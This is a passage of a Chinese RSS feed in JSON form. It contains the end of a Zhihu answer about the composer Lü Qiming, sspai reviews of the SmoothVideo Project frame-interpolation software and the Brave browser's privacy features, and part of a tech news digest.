data-private-watermark-src=\"v2-6729b562606d7b1a2a402966cde0a921\"></p>\n<p><br></p>\n<p>多年来，吕其明始终坚持创作。2020年新冠肺炎疫情来袭，全国数百万名医务人员奋战在抗疫一线，吕其明深受感动，90岁高龄的他以电影《白求恩大夫》原创音乐作为素材，创作了单乐章的随想曲《白求恩在晋察冀》 ，回望白求恩的国际人道主义精神，致敬抗击新冠肺炎疫情的医务工作者，奏出时代与历史的交响。</p>\n<p><br></p>\n<p><b>吕其明曾说：“我一生就做了一件事，就是用创作践行入党誓言”。</b></p>\n<p><br></p>\n<p>老一辈艺术家们，用为人民创作、为人民放歌的一生，向新时代文艺工作者传达了榜样的力量——</p>\n<p><b>坚定理想信念，砥砺从艺初心，用有筋骨、有道德、有温度的文艺作品，彰显信仰之美、崇高之美，让理想信念的明灯永远在人民心中闪亮。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21011693/answer/2109571133?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">82 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20300859?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎样评价《伤不起》、《爱情买卖》、《最炫民族风》这样的歌曲？</a><br><a href=\"http://www.zhihu.com/question/345474407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你有哪些私藏好听的歌曲？你觉得有没有值得推荐的歌曲呢？</a><br>\n","link":"http://www.zhihu.com/question/21011693/answer/2109571133?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"App+1｜借 SmoothVideo Project 享受「丝般顺滑」的观影体验","date":"2021-09-09 06:30:00","description":"\n<p>玩游戏的时候，我们都会关注一个技术指标，那就是帧率（Frame rate），它的意义在于每秒钟画面出现的帧数（frames per second, fps）。一般来说，帧数越高，画面就越流畅。比如游戏《原神》在移动端提供两档帧率，30 fps 和 60 fps，可供选择，无须多言，在硬件支持的情况下，60 fps 要比 30 fps 看起来流畅很多。</p>\n<p>那么，看电影呢？其实，标准的电影画面是以 24 fps 进行播放的。尽管听起来 24 fps 甚至还没有 30 fps 高，但是一般来说，由于电影中的动态模糊效果更为明显、真实，所以即使是 24 fps，我们也不会觉得非常不流畅。这也就是说，我们平常看到的大多数电影、电视剧，都是以 24 fps 进行播放的（尤其是在电脑、电视上）。</p>\n<p>尽管我们早就可以用更高的帧率进行数字拍摄（比如 iPhone 已经支持以 4K 60fps 进行拍摄）、显示屏也大多以 60Hz 进行刷新（甚至有许多设备已经用上了「高刷」，以 90Hz 乃至 120 Hz 进行刷新），也就是说可以以 60 fps 或者更高的帧率原生播放视频。然而，我们观看的内容还是以 24 fps 播放 —— 如果可以把电影转换成 60 fps 乃至更高呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn555b34td27usptu0.png\"></figure><p>软件 SmoothVideo Project（下文简称「SVP」），正是要把低帧率的电影、电视剧通过补偿中间帧的方式以更高帧率播放，从而达到「更加流畅」的观影体验。</p>\n<h2>原理、安装与配置</h2>\n<p>这款 app 背后的「核心技术」是<strong>插帧技术</strong>（frame interpolation technique）。这项技术能够通过对两帧之间的差异进行分析，对缺失的画面进行「技术上的弥补」，从而使得画面看起来更加流畅、真实。这项技术也常常用于处理慢动作视频，比如之前发布小米 11 Ultra 正是利用这项技术将 480 fps 的慢动作视频扩展到 1920 fps。</p>\n<h3>安装</h3>\n<p>到 <a href=\"https://www.svp-team.com/zh/get/\" target=\"_blank\">官网</a> 下载对应系统的安装包并按照提示安装即可。SVP 支持 Windows（7 / 8 / 10 / 11）、macOS（10.12 或以上版本）、Linux（64 位）和 Android（尚处于测试中，需要骁龙 855 或者更新的处理器）。</p>\n<h4>Windows</h4>\n<p>Windows 上安装 SVP 比较简单。在 Windows 安装配置的过程中，需要选择你目前使用的播放器。SVP 可以集成到各类播放器中（比如 VLC、mpv 等），如果需要，可以在这里勾选。其他设置暂时保留默认即可，如有需要，日后也可从 SVP 控制面板中再行配置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55lb34td201m5uqg.png\"></figure><h4>macOS</h4>\n<p>在 macOS 上，由于 SVP 支持的播放器不能在安装的时候进行自动的播放器插件配置，所以，一定的手动步骤是必要的。</p>\n<ul>\n<li>\n<strong>必要：</strong>安装 <code>mpv</code>。<code>mpv</code> 是 SVP 所依赖的播放器，所以务必安装。使用下载的 SVP 镜像文件中的 <code>Install mpv.command</code> 可以方便地一次性安装 <code>Homebrew</code>、带有 <code>Vapoursynth</code> 支持的 <code>mpv</code>，以及写入推荐的 <code>mpv.conf</code> 配置文件。当然，如果你对一次性执行的代码不够放心，也可以参考镜像文件中的 <code>readme.rtf</code> 文件，手动进行安装配置，其中也主要用到了 <code>Homebrew</code>。</li>\n<li>\n<strong>根据个人使用情况选择：</strong> <code>readme.rtf</code> 文件还列出了 IINA 和 VLC 两款播放器的配置方法。其中，VLC 比较简单，IINA 则比较复杂，有兴趣、有需要的读者可以自行探索。下文也会提到 VLC 的配置方式。</li>\n</ul>\n<h3>第一次启动</h3>\n<p>第一次开启 SVP 时，app 会提示进行一次系统性能测试。系统性能测试可以帮助 app 自动匹配适合这台计算机的渲染配置（比如帧率、GPU 加速方式等等），不过这些配置可以后来手动更改。如果你不想测试，也可以点击跳过。此外，SVP 还会弹窗提示激活。如果你目前还不想购买这款 app，可以先点击试用，软件提供 30 天的评估时间。特别地，Linux 版本是免费的（相应地，功能有一定缺失）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55lb34td201m5ur0.png\"></figure><h3>简单配置</h3>\n<p>启动后就可以对视频进行简单的配置了。你可以在这里调整想要播放视频的帧率（可以是根据视频原本的帧率或者是屏幕刷新率进行动态调整，也可以是固定一个帧率）、你想要的是更高的性能还是更好的视频质量、优化模式（电影还是动画），以及伪影去除的程度。如果在稍后播放视频的时候觉得不太满意，还可以回来进行调整。如果你觉得满意了，可以把配置保存起来，以便之后使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn55tb34td201m5urg.png\"></figure><p>让我们来播放一个视频吧！由于已经安装了 mpv，我们可以使用 SVP 内置的「打开文件」命令进行视频的播放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn565b34td201m5us0.png\"></figure><h2>多场景使用</h2>\n<p>SVP 可以通过内置的播放器（mpv）播放本地视频，也可以监视剪贴板，通过内置播放器来播放在线视频，这两项功能都是利用 GPU 运算实时进行补帧运算；你也可以在内置的帧率转换器中，把自己现有的视频转换为更高帧率，从而传送到其他设备观看。</p>\n<h3>使用播放器播放本地视频</h3>\n<p>直接使用「打开文件」命令就可以了。在播放的时候，你可以在屏幕的左下角看到一些参数，包括当前播放的文件帧率。如果文件帧率没有达到你的预期，可以考虑调整一下配置，让电脑算力能够满足需要。</p>\n<p>如果你需要使用第三方的播放器来配合一些特色功能使用（比如字幕、播放列表等等），在 Windows 上安装 SVP 的时候要记得进行相应的勾选，安装完成后要进行相应配置；macOS 上也是类似的。本文以 VLC 为例：只需要在 SVP 配置菜单的「工具」下勾选「VLC 的 SVP 插件」，之后在 VLC 中打开的视频就会自动按照当前的 SVP 配置进行播放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56db34td2ab6q9fg.png\"></figure><h3>播放网络流式视频（SVPtube）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56lb34td2engksh0.png\"></figure><p>想要播放网站上的视频，只需要把视频链接复制下来，SVPtube 会自动侦测到复制的链接，然后点击右侧「播放」按钮即可。</p>\n<p>经测试，SVPtube 以 <a href=\"https://github.com/ytdl-org\" target=\"_blank\">youtube-dl</a> 作为基础，可以灵敏地获取包括微博、B 站、YouTube 等常见视频网站的播放源并利用补帧技术进行高帧率播放。当然，如果是 youtube-dl 不支持的视频网站，那么也无法使用 SVPtube 进行播放。播放时使用的播放器默认是 mpv，不过可以在系统任务栏（Windows）或者菜单栏（Mac）上的 SVPtube 图标中进行自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56lb34td2engkshg.png\"></figure><p> </p>\n<h3>视频帧率转换</h3>\n<p>SVP 也提供了视频帧率转换的功能。例如，你的电视、手机或者是平板电脑并不能原生运行 SVP，但是可以在电脑上使用 SVP 将低帧率的视频转换为较高帧率之后，把转换后的文件拷贝到这些设备上播放。SVP 转换工具所使用的视频配置与上文「配置」页面中相同，此外，你还可以设置渲染视频时的计算方式、码率等等高级设置。默认情况下，转换的视频文件会与源文件存放在同一个文件夹下，文件名会以「SVP」结尾，文件类型也不会发生更改。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn56tb34td27usptug.png\"></figure><h2>使用体验 Q &amp; A</h2>\n<h3>Q1：效果明显吗？</h3>\n<p>在实际使用 SVP 的过程中，我个人感觉效果还是十分明显的。升高帧率之后，画面变得更加「流畅」，而且整体给人的感觉的确更加栩栩如生。不过，问题在于，可能并不是每个人都会喜欢这种高帧率的观影方式。「电影质感」在很大程度上也是借助 24 fps 这个帧率所实现的。但是，如果你已经习惯了各种游戏的 60fps 帧率，我想，至少说高帧率电影是一种新奇的体验，这是不过分的。</p>\n<h3>Q2：硬件开销如何？</h3>\n<p>不过，这种新奇的体验，是以消耗更多硬件配置为代价的。在我的 2016 款基础版 MacBook Pro 上（Intel i5 6360U），1080p 视频已经无法以 60fps 进行即时流畅渲染，观看的过程中会出现明显的卡顿现象；但是在我 8 代 i7 处理器的 NUC 上，60fps 还是比较流畅的。</p>\n<p>示例图中我正在播放的是 1080p 48fps 视频。可见，我的 Mac 勉强可以维持 48fps 的帧率进行播放，此时 CPU 和内存都处于负载较重的状态，时不时掉帧，风扇也很快来到最大转速。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4sn575b34td27usptv0.png\"></figure><p>如果你是 Nvidia 图灵或者安培架构显卡的用户（RTX 20 系列和 RTX 30 系列），SVP 的使用体验可能会更好，因为它支持 Nvidia 的 Optical Flow SDK。这一技术能够为补帧计算过程提供更加优化的算法，速度更快、效率更高。我个人没有这么高级的 N 卡设备，所以无法进行实际的测试。有条件的读者，可以尝试。</p>\n<h3>Q3：有没有效果最好的帧率？</h3>\n<p>我尝试将一段 24fps 的视频转换成为 48fps（2x）、60fps（2.5x）和 120fps（5x），发现 48fps 和 60fps 的效果要明显好于 120fps，这提示我们，<strong>可能并非帧率越高越好</strong>。对于 24fps 的原始视频来说，如果通过插帧的方式补偿到 120fps，意味着原来的两帧之间要插入四帧，这一方面比较浪费计算资源 —— 我这一段 20 分钟的视频，转换为 120fps 花费的时间远长于 1 小时；而且在我电脑上如果实时渲染，帧率是无法达到 120fps 的。另一方面，在补帧过程中出错的概率也更高，播放时可以明显看出一定瑕疵。经过与本文责编的讨论，我们认为，<strong>把帧率设置在原帧率的 2-3 倍，效果最佳</strong>。</p>\n<h2>小结</h2>\n<p>从电影院到客厅再到卧室，影视作品总是我们消磨时光的好帮手。如果你也想以一种更高帧率的方式欣赏自己珍藏的影视大作，SVP 不妨一试。本文只介绍了基础的方法与使用体验，如果在使用软件的时候需要帮助，可以访问 SVP 的 <a href=\"https://www.svp-team.cn.com/wiki/Main_Page\" target=\"_blank\">在线帮助文档</a>，官方提供了非常完善的使用说明，并且有中文版。</p>\n<p>软件为买断制，售价 19.99 美元，提供试用版本，期限 30 天。试用期间，视频转换的结果带有水印，但即时渲染方式的视频不受此影响。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，不再错过任何一款好用的 App 💡</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68665"},{"title":"都基于 Chromium，它有什么不同：Brave 浏览器简介","date":"2021-09-09 03:28:07","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>全球范围内的浏览器「一超多强」的格局已经非常清晰，但平静的水面下往往暗潮涌动：商业公司隐私丑闻接连不断，隐私立法逐步健全，人们对数据安全愈发关心，浏览器厂商亦需要做出抉择。但作为广告分发商的 Google 显然在平衡数据的保护和使用上犯了难，屏蔽第三方 cookies <a href=\"https://www.theverge.com/2021/6/24/22547339/google-chrome-cookiepocalypse-delayed-2023\" target=\"_blank\">一拖再拖</a>，试图推行 FLoC 碰壁，Chrome 隐私保护举措并没有让大众满意，</p>\n<p>和 Google 的沉默不同，2016 年 Brave Software 推出了一款以运行快速、隐私安全为口号的浏览器：Brave。该浏览器同样基于 <a href=\"https://www.chromium.org/\" target=\"_blank\">Chromium</a> 开发，内嵌了跟踪及广告拦截，无需帐号即可同步数据，支持全平台，开源并且采用了独特的盈利方式。本文也从这五个角度出发，介绍这样一个小众的浏览器。</p>\n<h2>基于 Chromium 进行开源开发</h2>\n<p>从 <a href=\"https://brave.com/\" target=\"_blank\">官网</a> 或 <a href=\"https://github.com/brave/brave-browser/releases\" target=\"_blank\">项目主页</a> 下载并安装 Brave 后，Chrome 用户只消简单探索一两分钟，就能完全掌握它的各种设置。Brave 基于 Chromium，大部分设置的位置与设计并没有做改动。我们可以用 F12 调出控制台，能用 <code>chrome://restart</code> 来重启，也能输入 <code>chrome://flags</code> 进入隐藏功能界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmn5b34td2ab6q9jg.png\"><figcaption>Brave 清爽的主界面</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmnlb34td2engksn0.png\"><figcaption>Flags 界面</figcaption></figure><p>基于 Chromium 既能让使用 Brave 的用户不会像使用 Firefox 那样碰到网站不支持的情况，也意味着 Chrome Web Store 的扩展与主题配色同样适用于 Brave，用户可享受完整的浏览器拓展生态。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmntb34td201m5uug.png\"><figcaption>添加扩展界面</figcaption></figure><p>Chromium 为 Brave 带来了优良的兼容性和扩展能力，但和 Chrome、Edge 等其他 Chromium 系浏览器不同，Brave 是完全 <a href=\"https://github.com/brave\" target=\"_blank\">开源</a> 的。此外，它还内嵌了可自定义规则的跟踪与广告拦截功能。</p>\n<h2>跟踪与广告拦截</h2>\n<p>点按浏览器地址栏右侧的 Logo 即可呼出针对单个网站的跟踪与广告拦截设置。我们也能通过<code>设置 &gt; 屏蔽/阻止社交媒体/隐私设置与安全性</code> 来管理拦截器的全局设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmo5b34td2ab6q9k0.png\"></figure><p>下面着重讲述三个颇有特色的隐私保护手段。</p>\n<h3>注重隐私的搜索引擎</h3>\n<p>和 Chrome 等大众浏览器不同，Brave 预置的搜索引擎列表有不少以保护隐私为旗号的新面孔—— Qwant、Startpage、Brave 等，这里介绍其中的两个。</p>\n<p><a href=\"https://www.startpage.com/\" target=\"_blank\">Startpage</a> 是一个「中介」型的搜索引擎，用户输入关键词后，它的服务器代替用户向 Google 发送请求，然后把得到的结果返回给用户，如此一来就切断了 Google 跟踪用户的途径，在保证搜索结果高质量的同时，也能防止来自 Google 的跟踪。该搜索引擎背后的公司有很长的经营历史，十几年以前就发布 <a href=\"https://en.wikipedia.org/wiki/Startpage.com\" target=\"_blank\">公告</a> 称不再记录用户 IP。Startpage 也宣称该搜索引擎不记录历史，没有跟踪，只通过搜索结果的上下文展示广告以获得利润。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmo5b34td27uspu3g.png\"></figure><p>Brave <a href=\"https://search.brave.com/\" target=\"_blank\">自家的搜索</a> 于前不久面向大众正式推出，现在还处于 Beta 阶段。在它的 <a href=\"https://search.brave.com/help/independence\" target=\"_blank\">声明</a> 中，Brave 称其目标是建立一个真正独立的搜索引擎同 Google 竞争（而不是像 Startpage 那样）。目前对于检索结果不足的请求，用户可以在搜索设置中选择混用 Google 搜索结果（Google fallback mixing）。就笔者目前的体验来看，Brave 的英文搜索尚能接受，但中文搜索质量非常差，几乎完全不可用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmodb34td201m5uv0.png\"></figure><h3>针对浏览器指纹识别的拦截</h3>\n<p>我们在一些移动设备上录入指纹，需要一次一次按压指纹识别器，最终才能形成独一无二的指纹模型用于确认身份。同样，网站也能通过浏览器中用户一次又一次的点击来描摹出一个精确画像，从而实现横跨整个网络的跟踪。</p>\n<p>浏览器为网站提供了大量的<a href=\"https://docs.google.com/spreadsheets/d/1ZB1zINfGFcrcFzNg4eytRnBQN3nBoKHua2jhV_X6W80/edit#gid=0\" target=\"_blank\"> API</a>，通过埋入一些不可见的脚本、音频等元素，一个网站可以获得用户的设备类型、插件信息、浏览器的类型和版本、语言地域、字体、操作系统、屏幕分辨率等一系列信息，这些信息的某一个单独拿出来并不能用于识别用户，但当它们组合起来，往往就足够形成一个独一无二的「浏览器指纹」。各个网站共享共建用户数据库，某网站只需要将得到的浏览器指纹和已有的数据库对比，就能得知访客的身份和喜好。这种跟踪方式并非传统的 cookies 拦截或所谓的无痕模式能够阻止的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmolb34td27uspu40.png\"><figcaption>当用户请求一张图片时，会暴露的信息</figcaption></figure><p>读者可以使用 Chrome 等浏览器访问一个采用音频方式追踪用户的 <a href=\"https://audiofingerprint.openwpm.com/\" target=\"_blank\">测试站点</a>，点击生成指纹（Fingureprint me）。之后，清除缓存和 cookies（或进入无痕模式），再次访问测试站点生成指纹。可以发现两者是一样的，也就是说跟踪仍然可以进行。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmotb34td2engksng.png\"></figure><p>为了拦截这种精确的识别方式，Brave 浏览器的做法是阻止网站对一些 API 的访问（有可能导致网站无法工作），删除或修改一些 API，同时让一些 API 的值随机化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmotb34td201m5uvg.png\"><figcaption>图片来源：https://brave.com/privacy-updates-4/</figcaption></figure><p>打开 Brave 中的「拦截指纹识别」后，使用相同的方式测试，可以发现采用音频识别的浏览器指纹跟踪不再有效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmpdb34td2ab6q9kg.png\"></figure><h3>Brave 广告拦截</h3>\n<p>像 uBlock Origin 等第三方拦截器一样，内置的 Brave 广告拦截同样依赖于规则列表，规则列表能通过在地址栏输入<code>brave://adblock/</code> 找到。默认只会勾选适用于本地区的一个列表，以兼顾广告拦截效果和资源占用。它也支持在网页右键手动屏蔽某元素的特性，但不能像其他拦截器一样使用 URL 订阅第三方拦截规则。</p>\n<p>为了让某些网页能够正确运行，Brave 提供了一些额外的选项。例如，全局拦截跨站点 cookies 会导致网站无法加载「使用 Google 登录」按钮，所以它提供了单独放行 Google 的选项。要是某些网站不能正确运作，我们也可以通过地址栏的图标关闭拦截器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmplb34td27uspu4g.png\"></figure><p>内嵌跟踪与广告拦截不仅能给用户带来更安全隐私的浏览体验，也大大提高了网页加载速度。拦截了一些元素后，浏览器要下载的网页大小自然减少，所消耗的时间也会跟着减少。这也是在许多 <a href=\"https://www.youtube.com/watch?v=4-qnzTWA_ys\" target=\"_blank\">对比评测</a> 中 Brave 加载速度明显比其他浏览器快的主要原因。Brave 主页默认显示的统计信息清楚地展示了这一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmptb34td2ab6q9l0.png\"><figcaption>图片来自 <a href=\"https://twitter.com/tomgrundy/status/1432332361526493186?s=20\" target=\"_blank\">Twitter</a></figcaption></figure><p>不过，一旦用户登录帐号之后，互联网服务商便能够轻易地将用户行为和 ID 绑定起来，这种跟踪是无法进行拦截的。不少用户曾经对 Chrome 清除「全部」cookies 却有意排除 Google 域名的 <a href=\"https://twitter.com/ctavan/status/1044282084020441088\" target=\"_blank\">批评</a> 也正是源自类似的顾虑。但没有全局的帐号体系又怎么实现跨平台的数据同步呢？同步链（Sync Chain）是 Brave 的答案。</p>\n<h2>同步链与跨平台同步</h2>\n<p>想要启用多平台同步，用户需要进入浏览器<code>设置 &gt; 同步 &gt; 管理已同步的设备</code>。第一次如此操作的客户端会生成一个 32 字节的随机种子，这个种子被 BIP39（<a href=\"https://github.com/bitcoin/bips/blob/master/bip-0039/english.txt\" target=\"_blank\">助记种子</a>）编码为一连串英文单词，这串英文就是用于同步的 ID。</p>\n<p>与此设备同步数据的其他设备需要输入这串英文单词，或者扫描二维码以加入同步链。Brave 的服务器会使用这串英文以及时间戳对后续加入链的设备进行认证，如果通过，就能建立同步。同步的数据在客户端被加密，服务端仅获取必要的设备名称、类型和同步项目信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmq5b34td27uspu50.png\"></figure><p>同步类别和 Chrome 等浏览器没什么不同。Brave 的同步也可以实现从一个设备发送标签页到另一个设备的效果。需要注意的是， iOS 端目前仅支持书签和历史记录的同步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqdb34td27uspu5g.png\"></figure><h2>移动端体验</h2>\n<p>说到了全平台同步，也就不得不提 Brave 的移动端体验。</p>\n<p>性能方面，因为 Chrome 只对 8G RAM 及以上的 Android 设备推送 64 bit 版本，而 Brave 无此限制，所以理论上对于一些没有足够大 RAM 的 Android 设备来说，Brave 较 Chrome 性能要好上一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqlb34td27uspu60.png\"><figcaption>注意版本号后面的 64-bit 标识</figcaption></figure><p>而基础体验方面，Brave 提供的是上下两栏布局，更方便单手操作，但并没有保留笔者个人比较喜欢的滑动选择菜单的特性。主页、设置的内容与设计大致和桌面端保持一致。得益于 Chromium，它对 PWA 的支持较 Firefox 要好上不少。Brave 还提供了音视频后台播放的特色功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmqtb34td2engkso0.png\"></figure><p>它也将跟踪和广告拦截器带到了 Android 平台，入口在「Brave shields &amp; privacy」中。地址栏直接填入 <code>brave://adblock</code> 可跳转到自定义广告拦截规则集页面，功能与桌面端基本一致。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrdb34td201m5v00.png\"></figure><h2>代币与盈利手段</h2>\n<p>虽然是开源软件，但 Brave 背后并非像 Mozilla Foundation 那样的非盈利组织，那么 Brave Software 如何通过一款免费的浏览器赚钱呢？</p>\n<p>答案还是广告。Brave 拦截了第三方的各类广告与跟踪，代之以不跟踪的自家平台广告。自家的广告在内置拦截器的白名单中。<a href=\"https://brave.com/brave-ads/\" target=\"_blank\">Brave 认为</a>，现有的广告于用户而言是侵犯隐私且影响使用体验的，于广告主而言则存在大量广告欺诈，因而引发用户反感的同时，也让广告主们事倍功半。</p>\n<p>Brave 建立了一个以注意力代币（BAT）为核心的广告体系。这在用户端表现为 Brave 奖励（Brave Rewards），入口在地址栏的右侧。Brave 的宣传口号「Proud to support a faster, safer web」也可能是在暗示这样一个共赢的广告分发体系。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrlb34td2ab6q9lg.png\"></figure><p>浏览器的广告默认开启，会通过首页壁纸、设备通知等不影响网页浏览体验的形式推送给用户。用户观看广告后，会有相应的代币奖励。这些奖励可以被用来打赏网页创作者或在月底提现。但对于普通用户而言，奖励金额并不多（官方称 $5 每月）。由于代币实际上是加密货币，<a href=\"https://www.youtube.com/watch?v=sV3Y0UkW0aI\" target=\"_blank\">提现操作</a> 需要接入第三方服务商并提供身份信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4snmrtb34td201m5v0g.png\"></figure><p>披露自身的盈利手段和广告分发细节确实有助于赢得信任，而尊重用户的选择自由能够增加使用者的好感。</p>\n<p>如果不愿意看到 Brave 广告，浏览器设置界面有显眼的开关，可随时关闭或者隐藏这些广告。</p>\n<h2>总结</h2>\n<p>无论是研究如何拦截多种形式的跟踪，还是创建一个互利的广告分发平台，Brave 都扮演了一个探索者的角色。Firefox 在其官网的 <a href=\"https://www.mozilla.org/en-US/firefox/browsers/compare/brave/\" target=\"_blank\">对比文章</a> 中也对 Brave 有不少的赞扬。</p>\n<p>此外，Brave 应该还执行了更严格的内存控制策略，能明显发现其资源占用比 Chrome 更好。在切换到 Brave 的时日里，笔者愈发感觉它不是简单能用 Chromium + adblock + HTTPS Everywhere 概括的。</p>\n<p>如果读者不满目前的网页浏览体验，有意尝试一下新的浏览器，Brave 或许是一个不错的选择。</p>\n<p>封面：修改自 Brave <a href=\"https://brave.com/media-assets/\" target=\"_blank\">媒体资产</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68666"},{"title":"派早报：理光发布 GR IIIx、大疆发布新款手机云台、《鬼灭》第二季定档等","date":"2021-09-09 00:46:55","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>理光正式发布 GR IIIx 相机</h3>\n<p>9 月 8 日，相机品牌理光正式发布了新款紧凑型相机 RICOH GR IIIx。RICOH GR IIIx 是 RICOH GR III 的同级产品，外观等方面没有明显变化，区别在于镜头焦距变为等效 40 mm，并支持 50 mm 和 71 mm 的等效裁切；微距模式的最近对焦距离为 12 cm。RICOH GR IIIx 目前已经在电商平台开启预售，价格为 6199 元。<a href=\"https://www.grblog.jp/article/14306/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/8ed24b723487d3226ffedf4e7a5be495\"><figcaption>图片截取自理光网站</figcaption></figure><h3>大疆推出 Osmo Mobile 5 手机云台</h3>\n<p>9 月 8 日晚间，大疆公司推出新一代手机云台产品 DJI Osmo Mobile 5，与前代产品相比，OM 5 大幅减轻了重量，可以折叠收纳至口袋中，并支持伸缩功能，可以将云台变为自拍杆使用。DJI Osmo Mobile 5 定价 999 元，目前已开放购买。<a href=\"https://www.sohu.com/a/488648703_324615\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/7920c580e8ca4b09f720354824ee2adf\"><figcaption>图片截取自 DJI 网站</figcaption></figure><p>我派在 B 站等平台已经发布 DJI OM 5 的上手体验，点击即可观看：</p> <h3>英特尔推出 NUC 游戏本</h3>\n<p>9 月 7 日，英特尔推出 NUC X15 系列笔记本电脑，该系列电脑采用了 Tiger Lake 标压处理器、英伟达 RTX 30 系列显卡及最高 240 Hz 的显示屏，默认不带硬盘。NUC X15 系列不直接面向消费者销售，旨在帮助没有游戏本设计经验的厂商进入该领域。<a href=\"https://www.ithome.com/0/574/013.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/article/89caa5e33eef53f84a54d8e9b91a6cc3\"><figcaption>图片来自新闻源</figcaption></figure><h3>任天堂确认 OLED 版 Switch 的发售日期</h3>\n<p>任天堂公司于 9 月 8 日对外宣布，OLED 版 Switch 游戏机将于 9 月 24 日开启预售，10 月 8 日正式上市，售价 37,980 日元（约 2,230 元人民币）。任天堂此前明确表示，公司短期内并无新品主机计划。<a href=\"https://tech.ifeng.com/c/89MsZxRR5Un\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img 